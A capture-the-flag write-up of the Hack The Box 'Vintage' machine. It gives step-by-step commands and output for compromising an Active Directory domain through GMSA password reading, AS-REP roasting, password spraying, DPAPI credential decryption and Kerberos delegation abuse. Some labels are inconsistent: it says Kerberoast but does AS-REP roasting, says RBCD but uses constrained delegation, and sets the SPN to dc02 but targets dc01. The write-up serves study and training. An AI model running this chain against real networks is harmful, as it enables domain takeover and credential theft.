---
title: "HTB - Vintage (Hard | Windows | Active Directory)"
date: 2025-08-15
categories: [HackTheBox, Active Directory, pre2k, DPAPI]
tags: [htb, htb-vintage, active-directory, assume-breach, windows, nmap, netexec, bloodhound, bloodhound-python, kerberos, pre-windows-2000, gmsa, bloodyad, genericwrite, addself, targeted-kerberoast, targetedkerberoast-py, gettgt, hashcat, password-spray, dpapi, dpapi-py, impacket, evil-winrm, rbcd, constrained-delegation, getST, wmiexec, oscp-like, cpts-like]
image:
  path: https://i.pinimg.com/originals/1d/83/b2/1d83b2819267242133c8839aa666dc2f.gif
---

## Overview

Vintage is a Hard-rated Windows Active Directory box that simulates a real-world assume-breach pentest scenario — you're handed low-privileged credentials and need to work your way to Domain Admin. The attack chain is pure AD: Pre-Windows 2000 computer account abuse to read a GMSA password, then using GenericWrite to perform a Targeted Kerberoast, cracking the hash to pivot to a domain user. From there, DPAPI credential extraction reveals an admin account positioned to abuse Resource-Based Constrained Delegation and fully compromise the domain.

## Box Info

| Field | Details |
|---|---|
| OS | Windows Server 2022 |
| Difficulty | Hard |
| IP | 10.10.11.45 |
| Domain | vintage.htb |
| Initial Credentials | P.Rosa : Rosaisbest123 |
| Release Date | 30 Nov 2024 |
| Retire Date | 26 Apr 2025 |

**Scenario:** As is common in real-life Windows pentests, you start with credentials for a low-privileged domain account: `P.Rosa / Rosaisbest123`.

---

## Recon

### Nmap

```bash
nmap -p- --open --min-rate 5000 -Pn -n 10.10.11.45
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.45
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: vintage.htb)
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC01; OS: Windows
```

Classic Domain Controller port profile — Kerberos (88), LDAP (389/3268), WinRM (5985), SMB (445). I'll add the hostname and domain to `/etc/hosts`:

```
10.10.11.45 DC01 DC01.vintage.htb vintage.htb
```

### Initial Credentials — NTLM Disabled

First thing I try is verifying the credentials over SMB:

```bash
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123
```

```
SMB  10.10.11.45  445  10.10.11.45  [-] 10.10.11.45\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

It fails. Looking at the output, `(NTLM:False)` tells me why — NTLM authentication is disabled on this domain. That's an important constraint that'll affect every tool I use. I need to switch everything to Kerberos. With `-k` it works:

```bash
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k
```

```
SMB  dc01.vintage.htb  445  dc01  [+] vintage.htb\P.Rosa:Rosaisbest123
```

Worth noting: Kerberos is sensitive to the hostname used. Using just `dc01` or `vintage.htb` fails because they don't resolve to the correct realm. I need the full FQDN `dc01.vintage.htb` throughout.

---

## Enumeration

### SMB Shares

```bash
netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --shares
```

```
Share       Permissions  Remark
-----       -----------  ------
ADMIN$                   Remote Admin
C$                       Default share
IPC$        READ         Remote IPC
NETLOGON    READ         Logon server share
SYSVOL      READ         Logon server share
```

Only default DC shares, nothing interesting. Moving on.

### LDAP Enumeration

Since NTLM is disabled, I need a TGT first to use Kerberos auth with ldapsearch and other tools:

```bash
kinit P.Rosa@VINTAGE.HTB
```

Confirming LDAP access and looking for privileged accounts:

```bash
nxc ldap 'dc01.vintage.htb' -k -u 'P.Rosa' -p 'Rosaisbest123' --admin-count
```

```
LDAP  dc01.vintage.htb  389  dc01  [+] vintage.htb\P.Rosa:Rosaisbest123
LDAP  dc01.vintage.htb  389  dc01  adminCount: L.Bianchi_adm
```

`L.Bianchi_adm` has `adminCount=1` — that's a protected admin account and likely the end goal. I'll also dump the full user list for later:

```bash
nxc smb 'dc01.vintage.htb' -k -u 'P.Rosa' -p 'Rosaisbest123' --rid-brute 10000 \
  | grep 'SidTypeUser' | awk '{print $6}' | cut -d'\' -f2 > users.txt
```

### BloodHound

With the domain enumerated, I'll collect BloodHound data to map the full attack surface:

```bash
bloodhound-python -u 'P.Rosa' -p 'Rosaisbest123' \
  -d 'vintage.htb' -ns 10.10.11.45 --zip -c All -dc 'dc01.vintage.htb'
```

```
INFO: Found AD domain: vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 computers
INFO: Done in 00M 18S
```

![BloodHound overview graph](/assets/img/posts/vintage/bh1.png)
![BloodHound attack path from P.Rosa](/assets/img/posts/vintage/bh2.png)

Key findings:

- `FS01$` is a member of the **Pre-Windows 2000 Compatible Access** group — its password is predictable
- `FS01$` has **ReadGMSAPassword** over `GMSA01$`
- `GMSA01$` has **AddSelf** and **GenericWrite** over `SERVICEMANAGERS`
- `SERVICEMANAGERS` has **GenericWrite** over multiple service accounts
- No direct path from P.Rosa to high-value targets — I need to pivot through computer accounts

---

## Foothold — Pre-Windows 2000 Attack

### Abusing Pre-Win2000 Computer Accounts

Computer accounts created with the "Pre-Windows 2000 Compatible Access" setting have a known default: their password is set to the lowercase hostname. `FS01$` is a member of that group, so its password should be `fs01`. I'll use `pre2k` to confirm and get a Kerberos ticket:

```bash
pre2k unauth -d vintage.htb -dc-ip 10.10.11.45 -save -inputfile users.txt
```

```
[INFO] VALID CREDENTIALS: vintage.htb\FS01$:fs01
[INFO] Saving ticket in FS01$.ccache
```

It works. I now have a valid Kerberos ticket for the `FS01$` machine account:

```bash
export KRB5CCNAME=FS01\$.ccache
```

### Reading the GMSA Password

BloodHound showed `FS01$` has `ReadGMSAPassword` over `GMSA01$`. Group Managed Service Accounts store their password in the `msDS-ManagedPassword` attribute — readable by accounts granted that right. I'll use `bloodyAD` with the `FS01$` ticket to extract it:

```bash
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  get object 'GMSA01$' --attr msDS-ManagedPassword
```

```
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:b3a15bbdfb1c53238d4b50ea2c4d1178
```

I have the NT hash for `GMSA01$`. Since NTLM auth is disabled, I can't use pass-the-hash directly — I need to convert this into a Kerberos ticket:

```bash
getTGT.py vintage.htb/'GMSA01$' -hashes :b3a15bbdfb1c53238d4b50ea2c4d1178
export KRB5CCNAME=GMSA01\$.ccache
```

### Adding GMSA01$ to SERVICEMANAGERS

`GMSA01$` has `AddSelf` over `SERVICEMANAGERS`, meaning it can add itself to the group. That group then has `GenericWrite` over the service accounts I need to target:

```bash
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  add groupMember "SERVICEMANAGERS" "GMSA01$"
```

![BloodHound GMSA01 to SERVICEMANAGERS path](/assets/img/posts/vintage/bh3.png)

---

## Lateral Movement — Targeted Kerberoast

Now that `GMSA01$` is in `SERVICEMANAGERS`, which has `GenericWrite` over the service accounts, I can perform a **Targeted Kerberoast**. The technique: use `GenericWrite` to set a `msDS-AllowedToDelegateTo` or — more directly — disable Kerberos pre-authentication on the target account (`DONT_REQ_PREAUTH`), then request an AS-REP hash to crack offline.

> **Note:** This is technically a Targeted Kerberoast via GenericWrite, not standard AS-REP Roasting. The difference matters: I'm *forcing* the condition on an account I have write access to, rather than finding accounts that were already misconfigured.

![BloodHound GenericWrite path to service accounts](/assets/img/posts/vintage/bh4.png)
![SERVICEMANAGERS members in BloodHound](/assets/img/posts/vintage/bh5.png)

### Re-enable Disabled Service Accounts

The service accounts are disabled by default. I need to re-enable them before I can interact with them:

```bash
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  remove uac svc_sql -f ACCOUNTDISABLE
```

![Re-enabling SVC_SQL with bloodyAD](/assets/img/posts/vintage/bloody2.png)

### Disable Pre-Authentication

With `GenericWrite`, I can set `DONT_REQ_PREAUTH` on the service accounts, making them roastable:

```bash
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  add uac svc_sql -f DONT_REQ_PREAUTH
```

![Disabling pre-auth on SVC_SQL](/assets/img/posts/vintage/bloody1.png)

> This only works on service accounts — attempting it on regular user accounts returns insufficient permissions.

### Request and Crack the Hash

```bash
GetNPUsers.py vintage.htb/ -request -usersfile users.txt -format hashcat
```

![GetNPUsers output with AS-REP hashes](/assets/img/posts/vintage/getnpusers1.png)

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

`SVC_SQL` cracks to `Zer0the0ne`.

### Password Spray → C.Neri

Service accounts often share passwords with regular users in poorly managed domains. I'll spray `Zer0the0ne` across all domain users:

```bash
./kerbrute_linux_amd64 passwordspray -d vintage.htb --dc 10.10.11.45 users.txt Zer0the0ne
```

```
[+] VALID LOGIN: C.Neri@vintage.htb:Zer0the0ne
```

### Shell as C.Neri

```bash
getTGT.py vintage.htb/'C.Neri':'Zer0the0ne'
export KRB5CCNAME=C.Neri.ccache
evil-winrm -i dc01.vintage.htb -r vintage.htb
```

```
*Evil-WinRM* PS C:\Users\C.Neri\Desktop> type user.txt
```

**User flag captured.**

---

## Privilege Escalation

### DPAPI Credential Extraction

Once on the box as `C.Neri`, I check the usual places for stored credentials. Windows Credential Manager stores credentials in `AppData\Roaming\Microsoft\Credentials`, encrypted with DPAPI master keys stored in `AppData\Roaming\Microsoft\Protect`:

```powershell
Get-ChildItem "C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials" -Force | Format-List
Get-ChildItem "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect" -Force | Format-List
```

![DPAPI AppData artifacts found](/assets/img/posts/vintage/dpapi-result.png)

Two master key files found. I'll download everything with evil-winrm's `download` command and decrypt offline using `C.Neri`'s password — since I know it, I can derive the master key without needing the domain backup key:

```bash
dpapi.py masterkey \
  -file "4dbf04d8-529b-4b4c-b4ae-8e875e4fe847" \
  -sid S-1-5-21-4024337825-2033394866-2055507597-1115 \
  -password Zer0the0ne
# Decrypted key: 0x55d51b40d9aa...

dpapi.py masterkey \
  -file "99cf41a3-a552-4cf7-a8d7-aca2d6f7339b" \
  -sid S-1-5-21-4024337825-2033394866-2055507597-1115 \
  -password Zer0the0ne
# Decrypted key: 0xf8901b2125dd...
```

With the master keys decrypted, I can now decrypt the credential blob:

```bash
dpapi.py credential \
  -file "C4BB96844A5C9DD45D5B6A9859252BA6" \
  -key <decrypted_master_key_hex>
```

![DPAPI credential blob decrypted](/assets/img/posts/vintage/dpapi-dump.png)

Credentials recovered: `C.Neri_adm : Uncr4ck4bl3P4ssW0rd0312`

This is `C.Neri`'s admin account — a common pattern in AD environments where admins have both a regular and a `_adm` account.

---

## Domain Admin via Resource-Based Constrained Delegation

### Re-enumerate with C.Neri_adm

Now that I have admin credentials, I'll re-run BloodHound to see what new paths open up:

```bash
bloodhound-python -u 'C.Neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' \
  -d 'vintage.htb' -ns 10.10.11.45 --zip -c All -dc 'dc01.vintage.htb'

getTGT.py vintage.htb/'c.neri_adm':'Uncr4ck4bl3P4ssW0rd0312'
export KRB5CCNAME=c.neri_adm.ccache
```

![BloodHound graph from C.Neri_adm](/assets/img/posts/vintage/bh6.png)
![Path to DELEGATEDADMINS group](/assets/img/posts/vintage/bh7.png)

BloodHound reveals: `C.Neri_adm` can add members to `DELEGATEDADMINS`, and accounts in that group have constrained delegation configured toward the DC. The plan:

1. Add `SVC_SQL` to `DELEGATEDADMINS` (gives it delegation rights)
2. Assign an SPN to `SVC_SQL` (required for delegation)
3. Use `getST.py` to impersonate `L.Bianchi_adm` (Domain Admin) against the DC

### Add SVC_SQL to DelegatedAdmins

```bash
bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 \
  -d "VINTAGE.HTB" -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k \
  add groupMember "DELEGATEDADMINS" "SVC_SQL"
```

### Re-enable SVC_SQL and Assign SPN

`SVC_SQL` is still disabled from earlier. Re-enable it and set an SPN — delegation only works on accounts that have one:

```bash
bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  remove uac svc_sql -f ACCOUNTDISABLE

bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB \
  --dc-ip 10.10.11.45 -k \
  set object svc_sql servicePrincipalName -v "cifs/dc02.htb"
```

### Get SVC_SQL TGT

```bash
getTGT.py vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb
export KRB5CCNAME=svc_sql.ccache
```

### Impersonate L.Bianchi_adm via S4U2Proxy

With `SVC_SQL` in `DELEGATEDADMINS` and constrained delegation configured for `cifs/dc01.vintage.htb`, I can use S4U2Self + S4U2Proxy to request a service ticket impersonating the Domain Admin:

```bash
impacket-getST \
  -spn 'cifs/dc01.vintage.htb' \
  -impersonate L.BIANCHI_ADM \
  -dc-ip 10.10.11.45 -k \
  'vintage.htb/svc_sql:Zer0the0ne'

export KRB5CCNAME='L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache'
```

### Shell as Domain Admin

```bash
wmiexec.py -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb
```

```
C:\> type C:\Users\Administrator\Desktop\root.txt
```

**Root flag captured. Domain fully compromised.**

---

## Attack Chain Summary

```
P.Rosa (low-priv creds)
  └─► NTLM disabled → forced Kerberos auth
  └─► BloodHound enumeration
  └─► FS01$ (Pre-Win2000 default password: fs01)
        └─► ReadGMSAPassword → GMSA01$ NT hash
              └─► AddSelf → joined SERVICEMANAGERS
                    └─► GenericWrite → Targeted Kerberoast on SVC_SQL
                          └─► Cracked: Zer0the0ne
                                └─► Password spray → C.Neri
                                      └─► DPAPI → C.Neri_adm credentials
                                            └─► AddMember → DELEGATEDADMINS
                                                  └─► RBCD → Impersonate L.Bianchi_adm
                                                        └─► Domain Admin ✓
```
